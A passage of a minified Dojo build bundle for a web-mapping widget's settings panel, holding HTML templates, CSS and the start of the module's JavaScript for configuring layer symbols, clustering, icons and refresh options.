data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoCustomSym" data-dojo-attach-event\x3d"onChange:_rdoCustomSymChanged" title\x3d"${nls.rdoCustom}" /\x3e\r\n                \x3cspan class\x3d"label"\x3e${nls.rdoCustom}\x3c/span\x3e\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"customSymbolDIV" class\x3d"jimu-r-row padTop10 sHeight marginLR20"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"uploadCustomSymbol" class\x3d"uploadCustom"\x3e\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"customSymbolPlaceholder" class\x3d"customPlaceholder"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3c!--Clustering Options--\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"parent_div_clusterOptions" class\x3d"clusterOptions"\x3e\r\n            \x3chr class\x3d"w" /\x3e\r\n            \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpClusterOptions"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"div_chkCluster" class\x3d"padTop20"\x3e\r\n                \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkClusterSym" title\x3d"${nls.chkCluster}" data-dojo-attach-event\x3d"onChange:_chkClusterChanged" /\x3e\r\n                \x3cspan class\x3d"label"\x3e${nls.chkCluster}\x3c/span\x3e\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv data-dojo-attach-point\x3d"clusterPickerContainer" class\x3d"jimu-r-row marginLR22 grpClusterOptions"\x3e\r\n              \x3cdiv class\x3d"jimu-float-leading"\x3e${nls.defineClusterSymbol}:\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"clusterPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker" class\x3d"jimu-float-trailing colorPick"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv class\x3d"jimu-r-row grpClusterOptions marginLR22" data-dojo-attach-point\x3d"grpClusterOptions"\x3e\r\n              \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkClusterCnt" title\x3d"${nls.displayClusterCnt}" data-dojo-attach-event\x3d"onChange:_chkClusterCntChanged" /\x3e\r\n              \x3cspan class\x3d"label"\x3e${nls.displayClusterCnt}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-r-row grpClusterOptions" data-dojo-attach-point\x3d"featureFont" style\x3d"display: none; margin-left: 45px; margin-right: 45px;"\x3e\r\n              \x3cdiv class\x3d"jimu-float-leading"\x3e${nls.defineClusterFont}:\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"colorPicker" data-dojo-type\x3d"jimu/dijit/ColorPicker" data-dojo-props\x3d\'color:"${_highLightColor}"\' class\x3d"marginLR30 colorPick2 jimu-float-trailing"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n        \x3cdiv class\x3d"label iconOptionsText padTop20" data-dojo-attach-point\x3d"iconOptionsTextLabel"\x3e\r\n          ${nls.iconOptionsText}\r\n        \x3c/div\x3e\r\n        \x3chr /\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_iconOptions" class\x3d"iconOptions"\x3e\r\n          \x3c!--Main Panel and cluster center Icon Options--\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpIconOptions"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"div_rdoLayerIcon"\x3e\r\n              \x3cinput name\x3d"b" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoLayerIcon" data-dojo-attach-event\x3d"onChange:_rdoLayerIconChanged" title\x3d"${nls.rdoLayerIcon}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoLayerIconLabel"\x3e${nls.rdoLayerIcon}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpCustomIconOptions"\x3e\r\n            \x3cdiv class\x3d"rdoCustomSym" data-dojo-attach-point\x3d"div_rdoCustomIcon"\x3e\r\n              \x3cinput name\x3d"b" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoCustomIcon" data-dojo-attach-event\x3d"onChange:_rdoCustomIconChanged" title\x3d"${nls.rdoCustomIcon}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoCustomIconLabel"\x3e${nls.rdoCustomIcon}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10 sHeight marginLR30"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"uploadCustomIcon" class\x3d"uploadCustom"\x3e\x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"customIconPlaceholder" class\x3d"customPlaceholder"\x3e\x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"panelFeatureDisplayContainer" class\x3d"panelFeatureContainer"\x3e\r\n      \x3cdiv class\x3d"label iconOptionsText padTop10" data-dojo-attach-point\x3d"featureOptionsTextLabel"\x3e\r\n        ${nls.featureOptionsText}\r\n      \x3c/div\x3e\r\n      \x3chr /\x3e\r\n      \x3cdiv class\x3d"btn-add-section enable" data-dojo-attach-point\x3d"btnAddField"\x3e\r\n        \x3cspan class\x3d"btn-add-icon"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"btn-add-label"\x3e${nls.addField}\x3c/span\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"fieldOptions" class\x3d"fieldOptions"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"label iconOptionsText padTop20" data-dojo-attach-point\x3d"groupOptionsTextLabel"\x3e\r\n        ${nls.groupOptionsText}\r\n      \x3c/div\x3e\r\n      \x3chr /\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"groupOptions" class\x3d"groupOptions"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"div_chkGroup"\x3e\r\n          \x3cinput data-dojo-type\x3d"dijit/form/CheckBox" data-dojo-attach-point\x3d"chkGroup" title\x3d"${nls.chkGroup}" data-dojo-attach-event\x3d"onChange:_chkGroupChanged" /\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"chkGroupLabel"\x3e${nls.chkGroup}\x3c/span\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"groupByOptions" class\x3d"groupByOptions"\x3e\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpField"\x3e\r\n            \x3cdiv class\x3d"rdoGroupField" data-dojo-attach-point\x3d"div_rdoGroupField"\x3e\r\n              \x3cinput name\x3d"c" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoGroupField" data-dojo-attach-event\x3d"onChange:_rdoGroupByFieldChanged" title\x3d"${nls.rdoGroupByField}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoGroupFieldLabel"\x3e${nls.rdoGroupByField}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"groupFieldOptions" class\x3d"groupFieldOptions"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n\r\n          \x3cdiv class\x3d"jimu-r-row padTop10" data-dojo-attach-point\x3d"grpRenderer"\x3e\r\n            \x3cdiv class\x3d"rdoGroupField" data-dojo-attach-point\x3d"div_rdoGroupRenderer"\x3e\r\n              \x3cinput name\x3d"c" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"rdoGroupRenderer" data-dojo-attach-event\x3d"onChange:_rdoGroupByRendererChanged" title\x3d"${nls.rdoGroupByRenderer}" /\x3e\r\n              \x3cspan class\x3d"label" data-dojo-attach-point\x3d"rdoGroupRendererLabel"\x3e${nls.rdoGroupByRenderer}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--Footer--\x3e\r\n  \x3cdiv class\x3d"footer padTop20"\x3e\r\n    \x3cdiv class\x3d"jimu-btn ok" data-dojo-attach-point\x3d"btnOk"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn cancel" data-dojo-attach-point\x3d"btnCancel"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/InfoSummary/setting/Setting.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"jimu-r-row"\x3e\r\n    \x3cdiv class\x3d"btn-add-section enable" data-dojo-attach-point\x3d"btnAddLayer"\x3e\r\n      \x3cspan class\x3d"btn-add-icon"\x3e\x3c/span\x3e\r\n      \x3cspan class\x3d"btn-add-label"\x3e${nls.addLayer}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"layerTable" class\x3d"padBottom20"/\x3e\r\n  \x3c/div\x3e\r\n  \x3cfieldset class\x3d"fieldSet optionsFieldSet"\x3e\r\n    \x3clegend class\x3d"fieldSetLegend"\x3e${nls.optionsText}\x3c/legend\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"optionsContainer"\x3e\r\n      \x3cdiv\x3e\r\n        \x3cdiv class\x3d"refreshOptions refreshOff" data-dojo-attach-point\x3d"refreshOptions"\x3e\r\n          \x3cdiv class\x3d"refreshIntervalTitle" title\x3d"${nls.refreshIntervalTitle}"\x3e\r\n            \x3cspan style\x3d"padding-right: 10px;"\x3e${nls.refreshIntervalInstruction}\x3c/span\x3e\r\n            \x3cinput type\x3d"text" name\x3d"refreshInterval"\r\n                   placeholder\x3d"${nls.refreshInterval}"\r\n                   data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n                   data-dojo-props\x3d"regExp:\'[\\\\d]+\', _hasBeenBlurred:true, trim:true"\r\n                   data-dojo-attach-point\x3d"refreshInterval"\r\n                   data-dojo-attach-event\x3d"onKeyUp:_updateOK"\r\n                   class\x3d"refreshInterval" required\x3d"true"\x3e\r\n            \x3cspan style\x3d"padding-left: 10px;"\x3e${nls.refreshUnit}\x3c/span\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"displayOptionsContainer" data-dojo-attach-point\x3d"displayOptionsContainer"\x3e\r\n        \x3cdiv title\x3d"${nls.panelCountOptionHelp}"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"panelCountOptions" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"panelCountOptionsLabel"\x3e ${nls.panelCountOption}\x3c/span\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"padTop20" title\x3d"${nls.panelIconOptionHelp}"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"panelIconOptions" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"panelIconOptionsLabel"\x3e ${nls.panelIconOption}\x3c/span\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"padTop20"\x3e\r\n          \x3cdiv class\x3d"mainPanelPreviewContainerOff" data-dojo-attach-point\x3d"mainPanelPreviewContainer"\x3e\r\n            \x3cdiv class\x3d"leftContainer"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"mainPanelPreviewButton" class\x3d"mainPanelPreviewButton"\x3e\r\n              \x3c/div\x3e\r\n              \x3cdiv class\x3d"instruction2"\x3e\r\n                ${nls.mainPanelText}\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"rightContainer"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"mainPanelPreview" class\x3d"bg rounded mainPanelPreview"\x3e\r\n                \x3cdiv class\x3d"panelContent bg"\x3e\r\n                  \x3cdiv class\x3d"page"\x3e\r\n                    \x3cdiv data-dojo-attach-point\x3d"panelMainIcon"\x3e\x3c/div\x3e\r\n                  \x3c/div\x3e\r\n                \x3c/div\x3e\r\n              \x3c/div\x3e\r\n              \x3cinput type\x3d"text" name\x3d"mainPanelText"\r\n                     placeholder\x3d"${nls.mainPanelTextPlaceholder}"\r\n                     data-dojo-type\x3d"dijit/form/TextBox"\r\n                     data-dojo-props\x3d"trim:true"\r\n                     data-dojo-attach-point\x3d"mainPanelText"\r\n                     class\x3d"mainPanelText"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv\x3e\r\n          \x3cdiv title\x3d"${nls.expandListHelp}"\x3e\r\n            \x3cinput data-dojo-attach-point\x3d"expandListOptions" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n            \x3cspan class\x3d"label" data-dojo-attach-point\x3d"expandListOptionsLabel"\x3e ${nls.expandList}\x3c/span\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"padTop20"\x3e\r\n          \x3cdiv title\x3d"${nls.showAllFeaturesHelp}"\x3e\r\n            \x3cinput data-dojo-attach-point\x3d"showAllFeaturesOptions" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n            \x3cspan class\x3d"label" data-dojo-attach-point\x3d"showAllFeaturesOptionsLabel"\x3e ${nls.showAllFeatures}\x3c/span\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"hidePanelContainer padTop20"\x3e\r\n          \x3cdiv title\x3d"${nls.hidePanelHelp}"\x3e\r\n            \x3cinput data-dojo-attach-point\x3d"hidePanelOptions" data-dojo-type\x3d"dijit/form/CheckBox" /\x3e\r\n            \x3cspan class\x3d"label"\x3e ${nls.hidePanel}\x3c/span\x3e\r\n            \x3cdiv class\x3d"padTop10 help-off" data-dojo-attach-point\x3d"hidePanelHelpText"\x3e\r\n              \x3cspan class\x3d"label note-help"\x3e ${nls.continuousRefreshHelp}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/fieldset\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/InfoSummary/setting/css/style.css":".jimu-widget-InfoSummary-setting {width: 100%; height: 100%;}.jimu-widget-InfoSummary-setting .btn-add-section {display: inline-block; overflow: hidden; height: 24px; margin-left: 1px; margin-bottom: 3px; cursor: pointer; font-size: 13px; color: #538ec8; padding-left: 5px; padding-right: 5px;}.jimu-widget-InfoSummary-setting .btn-add-section-disabled {display: inline-block; overflow: hidden; height: 24px; margin-left: 1px; margin-bottom: 3px; cursor: default; font-size: 13px; color: #a0acbf; padding-left: 5px; padding-right: 5px;}.jimu-widget-InfoSummary-setting .jimu-icon-edit {margin-left: 5px; margin-top: 5px;}.jimu-rtl .jimu-widget-InfoSummary-setting .jimu-icon-edit {margin-right: 5px; margin-top: 5px;}.jimu-widget-InfoSummary-setting .btn-add-section .btn-add-icon {height: 100%; width: 14px; background-repeat: no-repeat; background-position: center center; background-image: url(images/add.png); display: inline-block; vertical-align: top;}.jimu-widget-InfoSummary-setting .btn-add-section-disabled .btn-add-icon {height: 100%; width: 14px; background-repeat: no-repeat; background-position: center center; background-image: url(images/add.png); display: inline-block; vertical-align: top; opacity: .6;}.jimu-widget-InfoSummary-setting .btn-add-section .btn-add-icon:hover {background-image: url(images/add_hover.png);}.jimu-widget-InfoSummary-setting .btn-add-section .btn-add-label {height: 100%; line-height: 24px; margin-left: 7px; text-decoration: underline; display: inline-block; vertical-align: top;}.jimu-widget-InfoSummary-setting .btn-add-section-disabled .btn-add-label {height: 100%; line-height: 24px; margin-left: 7px; text-decoration: underline; display: inline-block; vertical-align: top;}.jimu-widget-InfoSummary-setting .instruction2{padding-top: 140px;}.jimu-widget-InfoSummary-setting .instruction2 span{color: #596679;}.jimu-widget-InfoSummary-setting .panelContent {position: relative; width: 340px; height: 150px;}.jimu-widget-InfoSummary-setting .page {position: relative; width: 340px; height: 150px; display: block; background-color: rgba(0,0,0,0.15);}.jimu-widget-InfoSummary-setting .panelMain {display: block;}.jimu-widget-InfoSummary-setting .hidePanelContainer {height: auto; float: left; display: block; padding-bottom: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .hidePanelContainer {height: auto; float: right; display: block; padding-bottom: 10px;}.jimu-widget-InfoSummary-setting .displayOptionsContainer {height: auto; float: left; display: block; padding-left: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .displayOptionsContainer {height: auto; float: right; display: block; padding-right: 10px;}.jimu-widget-InfoSummary-setting .marginLR20 {margin-left: 20px; margin-right: 20px;}.jimu-widget-InfoSummary-setting .marginLR22 {margin-left: 22px; margin-right: 22px;}.jimu-widget-InfoSummary-setting .marginLR25 {margin-left: 25px; margin-right: 25px;}.jimu-widget-InfoSummary-setting .marginLR30 {margin-left: 30px; margin-right: 30px;}.jimu-widget-InfoSummary-setting .continuousContainer {float: left; clear: left;}.jimu-rtl .jimu-widget-InfoSummary-setting .continuousContainer {float: right; clear: right;}.jimu-widget-InfoSummary-setting .rightContainer {float: left; position: relative; height: 210px;}.jimu-rtl .jimu-widget-InfoSummary-setting .rightContainer {float: right;}.jimu-widget-InfoSummary-setting .leftContainer {float: left; padding-right: 20px; position: relative; height: 210px;}.jimu-rtl .jimu-widget-InfoSummary-setting .leftContainer {float: right; padding-left: 20px; position: relative;}.jimu-widget-InfoSummary-setting .mainPanelPreviewContainerOn {display: table; padding-bottom: 10px;}.jimu-widget-InfoSummary-setting .mainPanelPreviewContainerOff {display: none;}.jimu-widget-InfoSummary-setting .refreshOff {display: none;}.jimu-widget-InfoSummary-setting .refreshOn {display: block;}.jimu-widget-InfoSummary-setting .uploadCustom {display: block; width: 25px; height: 25px; cursor: pointer; background-image: url(../css/images/edit_default.png); background-repeat: no-repeat;}.jimu-widget-InfoSummary-setting .uploadCustom:hover {display: block; width: 25px; height: 25px; cursor: pointer; background-image: url(../css/images/edit_hover.png); background-repeat: no-repeat;}.jimu-widget-InfoSummary-setting .sHeight{min-height: 25px; display: block; left: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .sHeight{min-height: 25px; display: block; right: 10px;}.jimu-widget-InfoSummary-setting .customPlaceholderSettings {display: block; width: 25px; height: 25px; cursor: default;}.jimu-widget-InfoSummary-setting .customPlaceholder {display: block; width: 25px; height: 25px; cursor: pointer; position: absolute; top: 5px; left: 20px;}.jimu-rtl .jimu-widget-InfoSummary-setting .customPlaceholder {display: block; width: 25px; height: 25px; cursor: pointer; position: absolute; top: 5px; right: 20px;}.jimu-widget-InfoSummary-setting .imageDataGFX {height:27px; float: left;}.jimu-rtl .jimu-widget-InfoSummary-setting .imageDataGFX {height:27px; float: right;}.jimu-widget-InfoSummary-setting .imageDataGFX-display {width:27px; height:27px;}.jimu-widget-InfoSummary-setting .imageDataGFX2 {display: block; margin-left: 5px; margin-bottom: 5px; margin-right: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .imageDataGFX2 {display: block; margin-right: 5px; margin-bottom: 5px; margin-left: 10px;}.jimu-widget-InfoSummary-setting .imageDataGFXMulti {width:100%; padding-right: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .imageDataGFXMulti {width:100%; padding-left: 10px;}.jimu-widget-InfoSummary-setting .displayOptions {padding-left: 40px; padding-right: 0px;}.jimu-rtl .jimu-widget-InfoSummary-setting .displayOptions {padding-right: 40px; padding-left: 0px;}.jimu-widget-InfoSummary-setting .symPickers{float:right; overflow:visible;}.jimu-widget-InfoSummary-setting .symPick {padding-top: 1px; padding-bottom: 1px; border: 0px solid #D7D7D7;}.jimu-widget-InfoSummary-setting .colorPick {border: 0px solid #D7D7D7;}.jimu-widget-InfoSummary-setting .colorPick2 {width: 28px; height: 28px;}.jimu-widget-InfoSummary-setting .symbolPreview {float: left; width: 280px; height: 340px; margin-left: 20px; margin-top:10px; border: 5px dashed gray;}.jimu-widget-InfoSummary-setting .iconPreview {float: left; width: 280px; height: 90px; margin-left: 20px; margin-top: 10px; margin-bottom: 10px; border: 5px dashed gray;}.jimu-widget-InfoSummary-setting .symbolOptionsContainer {overflow: hidden;}.jimu-widget-InfoSummary-setting .symbolPickerContainer {height: 100%; width: 100%; overflow: auto; padding-bottom: 8px; margin-top: 15px;}.jimu-widget-InfoSummary-setting .panelFeatureContainer {height: auto; display: none;}.jimu-widget-InfoSummary-setting .fieldOptions {width: 360px; max-height: 130px; overflow-y: auto; padding-left: 5px; padding-right: 5px;}.jimu-widget-InfoSummary-setting .groupOptions {position: relative;}.jimu-widget-InfoSummary-setting .groupFieldOptions {margin-top: 15px; width: 100%; height: auto; display: none; float: left; margin-bottom: 15px;}.jimu-widget-InfoSummary-setting .symbolOptionText {font-weight: bold;}.jimu-widget-InfoSummary-setting .symbolOptions{}.jimu-widget-InfoSummary-setting .w{width: 240px; position: absolute; left: 0px;}.jimu-rtl .jimu-widget-InfoSummary-setting .w{width: 240px; position: absolute; right: 0px;}.jimu-widget-InfoSummary-setting .rdoCustomSym{vertical-align: middle;}.jimu-widget-InfoSummary-setting .clusterOptions{min-width: 250px;}.jimu-widget-InfoSummary-setting .grpClusterOptions{padding-top: 16px;}.jimu-widget-InfoSummary-setting .iconOptionsText{font-weight: bold; width: 200px; display: -webkit-inline-box;}.jimu-widget-InfoSummary-setting .iconOptions{min-width: 250px; min-height: 95px;}.jimu-widget-InfoSummary-setting .checkBox {margin-left: 20px;}.jimu-rtl .jimu-widget-InfoSummary-setting .checkBox {margin-left: 20px;}.jimu-widget-InfoSummary-setting .height30{height: 30px;}.jimu-widget-InfoSummary-setting .padTop10{padding-top: 10px;}.jimu-widget-InfoSummary-setting .padTop20{padding-top: 20px;}.jimu-widget-InfoSummary-setting .padTop30{padding-top: 30px;}.jimu-widget-InfoSummary-setting .optionsText{padding-top: 25px; font-weight: bold;}.jimu-widget-InfoSummary-setting .mainPanelText{width: 340px; position: absolute; bottom: 10px;}.jimu-widget-InfoSummary-setting .refreshOptions{float:right; padding-right: 10px;}.jimu-rtl .jimu-widget-InfoSummary-setting .refreshOptions {float: left; padding-left: 10px;}.jimu-widget-InfoSummary-setting .refreshIntervalTitle{float:left;}.jimu-widget-InfoSummary-setting .refreshInterval{width:130px;}.jimu-widget-InfoSummary-setting .longSelect .dijitSelectLabel {text-align:left; text-overflow: ellipsis; overflow: hidden; max-width:295px; width:295px;}.jimu-widget-InfoSummary-setting .medSelect .dijitSelectLabel {text-align:left; text-overflow: ellipsis; overflow: hidden; max-width:150px; width: 150px;}.jimu-widget-InfoSummary-setting .loSelect .dijitSelectLabel {text-align:left; text-overflow: ellipsis; overflow: hidden; max-width: 88px; min-width: 88px;}.jimu-widget-InfoSummary-setting .goSelect .dijitSelectLabel {text-align:left; text-overflow: ellipsis; overflow: hidden; max-width: 145px; min-width: 145px}.jimu-widget-InfoSummary-setting .shortSelect .dijitSelectLabel {text-align:left; text-overflow: ellipsis; overflow: hidden; max-width: 81px; width: 81px;}.jimu-widget-InfoSummary-setting .innerMainPanelIcon {background-size: contain; width: 100%; max-width: 310px; height: 150px; background-repeat: no-repeat; background-position: 50% 50%; margin-left: 15px;}.jimu-widget-InfoSummary-setting .claro .dijitTextBox .dijitInputInner{font-size: 4px;}.jimu-widget-InfoSummary-setting .noMargin {margin-left: 0px; padding-left: 0px;}.jimu-widget-InfoSummary-setting .margin2 {margin-left: 2px;}.jimu-rtl .jimu-widget-InfoSummary-setting .margin2 {margin-right: 2px;}.jimu-widget-InfoSummary-setting .extraMargin {padding-left: 21px;}.jimu-widget-InfoSummary-setting .lyrSymbolSelected {outline: 1px solid #2196F3; background-color: aliceblue;}.jimu-widget-InfoSummary-setting .text-disabled {color: #a0acbf;}.jimu-widget-InfoSummary-setting .note-help {padding-left: 10px; font-style: italic;}.jimu-rtl .jimu-widget-InfoSummary-setting .note-help {padding-right: 10px; font-style: italic;}.jimu-widget-InfoSummary-setting .help-on {display: block;}.jimu-widget-InfoSummary-setting .help-off {display: none;}.jimu-widget-InfoSummary-setting .groupByOptions {}.jimu-rtl .jimu-widget-InfoSummary-setting .groupByOptions {}.jimu-widget-InfoSummary-setting .rdoGroupField{vertical-align: middle;}.jimu-widget-InfoSummary-setting .fieldSet {height: auto; width: 100%; border: 1px solid #a0acbf; border-radius: 5px; font-size: 14px; color: #596679; margin-bottom: 10px; min-width: 0px;}.jimu-widget-InfoSummary-setting .optionsFieldSet {padding: 15px 0px;}.jimu-widget-InfoSummary-setting .fieldSetLegend {margin-left: 20px;}.jimu-widget-InfoSummary-setting .padBottom20 {padding-bottom: 20px;}.jimu-widget-InfoSummary-setting .feature-display {padding-top: 10px; padding-bottom: 10px;}.jimu-widget-InfoSummary-setting .field-error {float: right; line-height: 0;}.jimu-rtl .jimu-widget-InfoSummary-setting .field-error {float: left; line-height: 0;}",
"*now":function(l){l(['dojo/i18n!*preload*widgets/InfoSummary/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/query dojo/dom-construct dojo/dom-class dojo/_base/declare dojo/_base/xhr dojo/_base/Color dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/LayerInfos/LayerInfos dijit/form/Select dijit/form/ValidationTextBox dijit/form/CheckBox jimu/dijit/Popup jimu/dijit/SimpleTable jimu/dijit/ImageChooser jimu/utils jimu/dijit/Message esri/request dijit/popup dojo/_base/lang dojo/DeferredList dojo/Deferred dojo/on dojo/dom-style dojo/_base/html dojo/_base/array ./MySymbolPicker dojox/form/FileUploader".split(" "),function(l,
x,n,v,h,e,p,q,b,d,m,z,w,A,u,g,B,J,E,y,H,I,D,C,k,G,c){return v([q,p],{baseClass:"jimu-widget-InfoSummary-setting",_layerInfos:null,mpi:null,layer_options:[],refreshLayers:[],displayPanelIcon:!1,used_layers:[],postCreate:function(){this.inherited(arguments);this.opLayers=this.map.itemInfo.itemData.operationalLayers;0===this.opLayers.length?(C.set(this.btnAddLayer,"display","none"),C.set(this.optionsContainer,"display","none"),C.set(this.displayOptionsContainer,"display","none"),this._disableOk(),new B({message:this.nls.missingLayerInWebMap})):
(this.setupLayerTable(),this.setupRefreshInterval(),this._getAllLayers(),this.own(D(this.btnAddLayer,"click",y.hitch(this,this._addLayerRow))),this.own(D(this.hidePanelOptions,"change",y.hitch(this,function(a){this.hidePanel=a;this.panelCountOptions.set("disabled",a);this.panelIconOptions.set("disabled",a);this.expandListOptions.set("disabled",a);this.showAllFeaturesOptions.set("disabled",a);if(a){k.addClass(this.panelIconOptionsLabel,"text-disabled");k.addClass(this.panelCountOptionsLabel,"text-disabled");
k.addClass(this.expandListOptionsLabel,"text-disabled");k.addClass(this.showAllFeaturesOptionsLabel,"text-disabled");this.displayPanelIcon=!1;if(a=l(".mainPanelPreviewContainerOn",this.mainPanelPreviewContainer.domNode)[0])k.removeClass(a,"mainPanelPreviewContainerOn"),k.addClass(a,"mainPanelPreviewContainerOff");n.contains(this.hidePanelHelpText,"help-off")&&k.removeClass(this.hidePanelHelpText,"help-off");k.addClass(this.hidePanelHelpText,"help-on")}else k.removeClass(this.panelIconOptionsLabel,
"text-disabled"),k.removeClass(this.panelCountOptionsLabel,"text-disabled"),k.removeClass(this.expandListOptionsLabel,"text-disabled"),k.removeClass(this.showAllFeaturesOptionsLabel,"text-disabled"),this.panelIconOptions.checked&&(this.displayPanelIcon=!0,a=l(".mainPanelPreviewContainerOff",this.mainPanelPreviewContainer.domNode)[0])&&(k.removeClass(a,"mainPanelPreviewContainerOff"),k.addClass(a,"mainPanelPreviewContainerOn")),n.contains(this.hidePanelHelpText,"help-on")&&k.removeClass(this.hidePanelHelpText,
"help-on"),k.addClass(this.hidePanelHelpText,"help-off")}))),this.own(D(this.panelCountOptions,"change",y.hitch(this,function(a){this.countEnabled=a}))),this.own(D(this.panelIconOptions,"change",y.hitch(this,function(){var a;this.panelIconOptions.checked?(this.displayPanelIcon=!0,a=l(".mainPanelPreviewContainerOff",this.mainPanelPreviewContainer.domNode)[0],k.removeClass(a,"mainPanelPreviewContainerOff"),k.addClass(a,"mainPanelPreviewContainerOn")):(this.displayPanelIcon=!1,a=l(".mainPanelPreviewContainerOn",
this.mainPanelPreviewContainer.domNode)[0],k.removeClass(a,"mainPanelPreviewContainerOn"),k.addClass(a,"mainPanelPreviewContainerOff"))}))))},startup:function(){this.inherited(arguments);this.refreshLayers=[];this.imageChooser=new u({format:[u.GIF,u.JPEG,u.PNG],label:this.nls.uploadImage,cropImage:!1,showTip:!1,goldenWidth:10,goldenHeight:15});C.set(this.imageChooser.domNode,"font-size","14px");k.place(this.imageChooser.domNode,this.mainPanelPreviewButton,"replace");this.connect(this.imageChooser,
